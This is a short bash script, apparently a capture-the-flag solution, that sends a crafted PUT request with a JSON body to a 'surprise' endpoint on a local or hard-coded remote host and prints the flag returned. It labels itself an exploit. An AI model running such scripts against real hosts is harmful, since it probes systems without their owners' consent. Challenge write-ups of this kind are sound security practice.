#!/bin/bash
PORT=8093

if [[ $1 == "local" ]]
then
    remote='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    remote='http://141.85.224.157:'$PORT
else
    remote=$1':'$2
fi

# Surprise
echo "Start exploit for Suprise"
remote=$remote'/surprise/'
flag=$(curl -s --request PUT --header "Content-Type: application/json" --data '{"name":"hacker"}' $remote | tail -n 1)
echo "Flag is $flag"
echo "-------------------------"
